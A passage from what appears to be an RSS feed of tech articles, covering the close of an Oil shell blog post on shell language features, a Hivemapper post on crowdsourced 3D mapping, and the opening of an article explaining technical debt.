<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>
<ul>
<li>Related: Posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=escaping-quoting#escaping-quoting">escaping-quoting</a>, particularly <a href="http://www.oilshell.org/blog/2017/09/29.html">Git Log
in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>
<p>If you haven't read it already, see <a href="http://www.oilshell.org/blog/2018/01/28.html">Why Create a Unix
Shell?</a>.  It's the most popular page on this site,
though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>
<a name="dev-tools-improvements"></a>
<h3>Dev Tools Improvements</h3>
<p>Speaking of which, several people have pointed out that the dev process for Oil
is difficult.  I've addressed this recently by removing spew from …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">http://www.oilshell.org/blog/2020/10/osh-features.html</a></em></p>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/10/osh-features.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871762</guid>
            <pubDate>Fri, 23 Oct 2020 17:23:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We are scaling a 3D map of the world with drones and dashcams]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24871396">thread link</a>) | @rels25
<br/>
October 23, 2020 | https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687 | <a href="https://web.archive.org/web/*/https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7170/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg" width="3585" height="1215" srcset="https://miro.medium.com/max/552/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 276w, https://miro.medium.com/max/1104/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 552w, https://miro.medium.com/max/1280/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 640w, https://miro.medium.com/max/1456/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 728w, https://miro.medium.com/max/1632/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 816w, https://miro.medium.com/max/1808/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 904w, https://miro.medium.com/max/1984/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 992w, https://miro.medium.com/max/2160/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1080w, https://miro.medium.com/max/2700/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1350w, https://miro.medium.com/max/3240/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1620w, https://miro.medium.com/max/3780/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 1890w, https://miro.medium.com/max/4320/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 2160w, https://miro.medium.com/max/4800/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*Ekkl-s8CgzqwrCCd2BkY-g.jpeg?q=20"></p></div></div></figure></div><div><div><div><div><div><div><p><a href="https://medium.com/@Hivemapper?source=post_page-----a624a09d687--------------------------------" rel="noopener"><img alt="Hivemapper" src="https://miro.medium.com/fit/c/96/96/1*PrxMVjinBagmTWTc1AjTyw.png" width="48" height="48"></a></p></div></div></div></div><p id="0785">Maps are one of the oldest types of technology in the world. We take them for granted and yet they’re critical and everywhere. But maps cost billions to produce and therefore don’t get updated frequently enough for businesses and machines that require up-to-date data.</p><p id="a0c7">To create a fresh and intelligent 3D map of the world, <a href="http://hivemapper.com/" rel="noopener">Hivemapper</a> combines a new software approach to making maps, with a <a href="https://hivemapper.com/collectors" rel="noopener">mapping network</a> of commodity drones and <a href="https://hivemapper.com/open-dash" rel="noopener">dashcam</a> to grow and update the map. The global 3D map we are building is scaling and updating four times faster, and at a fraction of the cost, of traditional mapping companies.</p><p id="2123">By comparison, where Google Maps deploys a small number of highly specialized cars driving around the world, we engage with an unlimited number of contributors who only need a dashcam or off-the-shelf drone to participate. Here’s a quick peek:</p></div></div><div><div><p id="255d">Since February 2020, collectors in the Hivemapper mapping network have been rapidly adding to and growing the global map:</p><ul><li id="8835"><strong>9,000 sq km </strong>— in more than 80 countries — have been mapped</li><li id="7fa3"><strong>50% monthly growth</strong> of the global map</li><li id="248f">In just one week, areas of the map have grown from <strong>1 to 90 sq. km</strong> — about three Manhattans</li></ul><p id="214d">Hivemapper regards a decentralized mapping network as critical mapping infrastructure necessary to democratize mapping, make mapping a utility like storage and bandwidth, and fuel the business use-cases and autonomous machines that require up-to-date 3D maps.</p><p id="5fbc">In a static world — no new roads, no closures, no natural disasters, no new development existing approaches to building and updating 2D and 3D maps are satisfactory. Yet, the physical world is changing faster than ever. Urbanization, climate change, autonomous transportation, and now pandemics are driving 15% of the global road network to change annually.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*bvdIk7dlMi1TC6r_baxykg.png" width="2280" height="1288" srcset="https://miro.medium.com/max/552/1*bvdIk7dlMi1TC6r_baxykg.png 276w, https://miro.medium.com/max/1104/1*bvdIk7dlMi1TC6r_baxykg.png 552w, https://miro.medium.com/max/1280/1*bvdIk7dlMi1TC6r_baxykg.png 640w, https://miro.medium.com/max/1400/1*bvdIk7dlMi1TC6r_baxykg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*bvdIk7dlMi1TC6r_baxykg.png?q=20"></p></div></div></div><figcaption>The world is changes faster, and today’s maps cannot keep up</figcaption></figure><p id="49e3">Today, Big Tech mapping companies spend billions of dollars to deploy fleets of highly specialized vehicles, fly airplanes equipped with advanced camera systems, and even launch satellites. Given the enormous expense, maps are rarely updated and companies apply expensive and restrictive licensing agreements to their use. For businesses that rely on maps for mission critical monitoring and navigation an out-of-date map is a serious issue:</p><ul><li id="f163">Google Maps was not updated for 12 months after the devastating fires in Santa Rosa (California) destroyed homes and infrastructure.</li><li id="89a6">Because Google and others are too slow to update, a delivery company operating in the Detroit area had to collect their own data for maps using multiple tools.</li><li id="750d">Each year 20% of structures in Dallas change; a delivery company hires teams of people to manually update these to reduce costly rejected deliveries.</li></ul><p id="2b88">However important maps already are, updated 3D maps are a mission critical piece of infrastructure for the navigation systems of autonomous vehicles. Feeding an out-of-date map to an autonomous vehicle is potentially catastrophic. The lack of large scale affordable and accurate 3D maps remain a key obstacle preventing the autonomous transportation promise from becoming an everyday reality.</p><p id="673f">We believe there are three pillars required to build and deliver a decentralized mapping network capable of turning 3D maps into an affordable and accessible utility for businesses and machines that require up-to-date maps.</p><p id="b314">When anyone with a commodity dashcam or drone can collect and contribute video it shifts the challenge from a costly logistics and hardware problem into a challenging software opportunity.</p><p id="1ba7">The <a rel="noopener" href="https://blog.hivemapper.com/engineering-a-living-map-introduction-4d4b3e5f28e8">technical breakthrough</a> of Hivemapper is that, leveraging modern compute power we can take nearly any source video of the physical world and convert it into an accurate 3D map. Additionally, the Hivemapper technology does not require all of the video to be produced by one source in a highly structured and organized way. Instead, Hivemapper receives, processes and transforms disparate videos into an accurate and intelligent 3D map.</p><p id="22f6">Think of the Hivemapper map as a puzzle where each video uploaded to Hivemapper forms one piece. The puzzle is only complete when each piece is in its proper place and Hivemapper makes all of the individual pieces come together. This core technology enables a decentralized network of contributors.</p><p id="e3d4">Our approach combining commodity video collections tools from different collectors with our mapping software produced this 50 sq km map around <a href="https://hivemapper.com/map?content=terrain&amp;content=context&amp;content=hmmap&amp;content-filters=color,highacc&amp;overlays=osm-planet&amp;view=-2698768.77,-4293712.18,3856567.37,-2.296,-0.709" rel="noopener">Stanford University</a>:</p></div></div><div><div><div><figure><div></div><figcaption>50 sq km of Silicon Valley built by dashcam and drones</figcaption></figure></div></div></div><div><div><p id="abad">How we built this map</p><ul><li id="9681">5 different video collectors, separately and on different days, collected video and uploaded to Hivemapper.com</li><li id="a577">The collectors used 3 different brands and types of commodity drones and dashcam: DJI, Autel, and Blackvue</li></ul><h2 id="8876"><strong><em>Cost effective</em></strong></h2><p id="23eb">Transforming the collected video into a 3D map is compute intensive. Over the last few years, we have devised novel ways to reduce the compute cost of creating the map enabling us to scale economically. Just in the last few months we have reduced the cost to compute by an additional 60% — a cost that will come down materially with additional scale.</p><p id="bf41">Because Hivemapper is designed to work in the cloud and at the edge from inception. Everything on <a href="http://hivemapper.com/map" rel="noopener">Hivemapper.com</a> can be deployed on a high-end gaming PC. When maps are produced on-premise, we spread the compute costs across many thousands of devices that are otherwise sitting idle.</p><p id="73d8">Our platform allows us to move more of the processing to the edge. All maps produced at the edge can be merged into the global 3D map hosted at <a href="http://hivemapper.com/" rel="noopener">hivemapper.com</a>. In 2021, we will take another big leap in reducing compute costs. Stay tuned.</p><p id="8aa6">The Hivemapper map is built from video collected by commodity drones, empowering virtually anyone to become a collector and earn additional income. Our approach provides an affordable, accessible alternative to the expensive and specialized mapping vehicles and satellites.</p><p id="673a">Earlier approaches to crowdsourced mapping required learning complex GIS interfaces involving tedious amounts of tracing lines across stale satellite imagery. Collecting video for the Hivemapper map can be done, simply, by anyone with a drone or dashcam.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*zhFzxKRcknjxZkvYcIxjAg.png" width="2280" height="1284" srcset="https://miro.medium.com/max/552/1*zhFzxKRcknjxZkvYcIxjAg.png 276w, https://miro.medium.com/max/1104/1*zhFzxKRcknjxZkvYcIxjAg.png 552w, https://miro.medium.com/max/1280/1*zhFzxKRcknjxZkvYcIxjAg.png 640w, https://miro.medium.com/max/1456/1*zhFzxKRcknjxZkvYcIxjAg.png 728w, https://miro.medium.com/max/1632/1*zhFzxKRcknjxZkvYcIxjAg.png 816w, https://miro.medium.com/max/1808/1*zhFzxKRcknjxZkvYcIxjAg.png 904w, https://miro.medium.com/max/1984/1*zhFzxKRcknjxZkvYcIxjAg.png 992w, https://miro.medium.com/max/2000/1*zhFzxKRcknjxZkvYcIxjAg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*zhFzxKRcknjxZkvYcIxjAg.png?q=20"></p></div></div></div><figcaption>Hivemapper mapping network</figcaption></figure></div></div></div><div><div><p id="868d">Drone pilots are growing the Hivemapper map from the air with $1,000 drones that have meaningful advantages compared over multi-million dollar satellites. Drones fly a few hundred feet above ground level producing a higher resolution map. Unlike a satellite, drone can easily fly below clouds, fog, and smoke as needed, and can see areas that satellites cannot see.</p><p id="f3ce">In 2021, to move even closer to the action at the street-level we will add dashcams as a new mode of video collection. The <a href="https://hivemapper.com/open-dash" rel="noopener">Open Dashcam</a> will make collecting video for the global map a part of the everyday drive.</p><p id="02ad">This launch represents a significant milestone towards building the first decentralized 3D mapping network for affordable, up-to-date, and accurate 3D maps.</p><h2 id="69b2">Hivemapper Studio is like Pokemon Go for drone pilots</h2><p id="c98a"><a href="http://studio.hivemapper.com/" rel="noopener">Hivemapper Studio</a> is the tool drone pilots use to connect their commodity drones to our mapping network.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3816/1*2TxRC754B7JU1sS6RBA1Eg.png" width="1908" height="850" srcset="https://miro.medium.com/max/552/1*2TxRC754B7JU1sS6RBA1Eg.png 276w, https://miro.medium.com/max/1104/1*2TxRC754B7JU1sS6RBA1Eg.png 552w, https://miro.medium.com/max/1280/1*2TxRC754B7JU1sS6RBA1Eg.png 640w, https://miro.medium.com/max/1456/1*2TxRC754B7JU1sS6RBA1Eg.png 728w, https://miro.medium.com/max/1632/1*2TxRC754B7JU1sS6RBA1Eg.png 816w, https://miro.medium.com/max/1808/1*2TxRC754B7JU1sS6RBA1Eg.png 904w, https://miro.medium.com/max/1984/1*2TxRC754B7JU1sS6RBA1Eg.png 992w, https://miro.medium.com/max/2000/1*2TxRC754B7JU1sS6RBA1Eg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*2TxRC754B7JU1sS6RBA1Eg.png?q=20"></p></div></div></div><figcaption>Hivemapper Studio — connect your drone to our mapping network</figcaption></figure></div></div></div><div><div><p id="2896">Studio breaks the world up into hexagon shaped tiles — 0.1 sq km per tile. Collectors can map 1 tile or 100,000 tiles providing total flexibility. <a rel="noopener" href="https://blog.hivemapper.com/hivemapper-studio-a-better-way-to-fly-841a2c330756">Studio</a> generates automated flight paths for the drone to map your selected tiles. These flight paths ensures contiguous coverage, high quality data, and a simplified collection process for drone pilots.</p><p id="392a">After uploading video for the tile, the collector earns a financial reward and their username is displayed on the tile — marking ownership of the map. The thrill of watching your creation grow with each tile you map is not easily understood until you enjoy it yourself.</p><p id="1e70">One of our early collectors, <a href="https://medium.com/@Hivemapper/building-a-better-map-together-af72b3699918" rel="noopener"><em>MrDundee</em></a><em>,</em> who has mapped over 1,000 tiles in Australia explained it best: “Hivemapper Studio is Pokemon Go for Pilots.” Perfect.</p><h2 id="dae6">Map the world while you drive</h2><p id="8db9">The launch of our <a href="https://hivemapper.com/open-dash" rel="noopener">Open Dashcam</a> in 2021 will use commodity hardware with publicly available specs, introducing a passive mode of collecting, and mapping the world while driving.</p></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7170/1*y7MuGKI7do-KQQEKYfrMfg.jpeg" width="3585" height="1215" srcset="https://miro.medium.com/max/552/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 276w, https://miro.medium.com/max/1104/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 552w, https://miro.medium.com/max/1280/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 640w, https://miro.medium.com/max/1456/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 728w, https://miro.medium.com/max/1632/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 816w, https://miro.medium.com/max/1808/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 904w, https://miro.medium.com/max/1984/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 992w, https://miro.medium.com/max/2160/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1080w, https://miro.medium.com/max/2700/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1350w, https://miro.medium.com/max/3240/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1620w, https://miro.medium.com/max/3780/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 1890w, https://miro.medium.com/max/4320/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 2160w, https://miro.medium.com/max/4800/1*y7MuGKI7do-KQQEKYfrMfg.jpeg 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*y7MuGKI7do-KQQEKYfrMfg.jpeg?q=20"></p></div></div><figcaption>Street-level maps, produced with Open Dashcam</figcaption></figure></div><div><div><p id="e4e6">When the dashcam connects to Wifi, collected data is uploaded automatically, moving data from your car to the map. Open Dashcam will be both affordable and easy to install on any vehicle. While we will sell the Open Dashcam via Hivemapper.com, we welcome other developers and partners to build Hivemapper compatible dashcams to help expand this global mapping community.</p><p id="7be3">Pricing will be available for the Open Dashcam soon —<a href="https://hivemapper.com/open-dash" rel="noopener"> join the waitlist</a> and get updated about details.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3800/1*1bYxlxIZMDpYqGQpkOwKLw.png" width="1900" height="866" srcset="https://miro.medium.com/max/552/1*1bYxlxIZMDpYqGQpkOwKLw.png 276w, https://miro.medium.com/max/1104/1*1bYxlxIZMDpYqGQpkOwKLw.png 552w, https://miro.medium.com/max/1280/1*1bYxlxIZMDpYqGQpkOwKLw.png 640w, https://miro.medium.com/max/1400/1*1bYxlxIZMDpYqGQpkOwKLw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*1bYxlxIZMDpYqGQpkOwKLw.png?q=20"></p></div></div></div><figcaption>Street-level maps, produced with Open Dashcam</figcaption></figure><p id="73ec">What’s in it for collectors to build and update the map for customers? Financial rewards (and fun). Clear financial incentives ensure that the map is predictable and reliable for enterprise customers. Unlike older approaches, we believe users who help create the product by infusing it with data should be remunerated for their efforts.</p><p id="15e5">Each tile on the map has a price. A user can map one tile and earn a little, or map a few thousand and earn far more. Maps for some areas are more valuable than others, reflected in the price of each tile.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3760/1*ZV67pHi0Dc2NwTRPjmfeEA.png" width="1880" height="1064" srcset="https://miro.medium.com/max/552/1*ZV67pHi0Dc2NwTRPjmfeEA.png 276w, https://miro.medium.com/max/1104/1*ZV67pHi0Dc2NwTRPjmfeEA.png 552w, https://miro.medium.com/max/1280/1*ZV67pHi0Dc2NwTRPjmfeEA.png 640w, https://miro.medium.com/max/1456/1*ZV67pHi0Dc2NwTRPjmfeEA.png 728w, https://miro.medium.com/max/1632/1*ZV67pHi0Dc2NwTRPjmfeEA.png 816w, https://miro.medium.com/max/1808/1*ZV67pHi0Dc2NwTRPjmfeEA.png 904w, https://miro.medium.com/max/1984/1*ZV67pHi0Dc2NwTRPjmfeEA.png 992w, https://miro.medium.com/max/2000/1*ZV67pHi0Dc2NwTRPjmfeEA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*ZV67pHi0Dc2NwTRPjmfeEA.png?q=20"></p></div></div></div></figure></div></div></div><div><div><p id="042e">Just as the physical world changes, so does the price to a map tile. Events like hurricanes, fires, and construction dynamically affect the price of tiles. When hurricanes are anticipated, insurance companies and first responders need to have an updated map such that once the hurricane passes, damages can be assessed quickly and accurately before and after the hurricane hits.</p><h2 id="b929">Get 1,000 tiles mapped for free</h2><p id="1a17">Mapping begets mapping. Hivemapper is accepting applications from businesses, governments, and organizations of all kinds looking to build a fresh new map of an area. We will pay collectors to map 1,000 tiles anywhere in the world. Learn more <a rel="noopener" href="https://blog.hivemapper.com/winners-choice-call-for-map-wish-lists-39e8e65a497e">here</a>.</p><p id="91de">As the mapping network continues to expand coverage, map data is becoming a digital utility like storage or compute. Just as storage and compute can be …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687">https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687</a></em></p>]]>
            </description>
            <link>https://blog.hivemapper.com/how-we-are-scaling-the-future-of-mapping-a624a09d687</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871396</guid>
            <pubDate>Fri, 23 Oct 2020 16:48:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Debt: Why it'll ruin your software]]>
            </title>
            <description>
<![CDATA[
Score 186 | Comments 136 (<a href="https://news.ycombinator.com/item?id=24871348">thread link</a>) | @yannikyeo
<br/>
October 23, 2020 | https://labcodes.com.br/blog/articles/tech-debt.html | <a href="https://web.archive.org/web/*/https://labcodes.com.br/blog/articles/tech-debt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
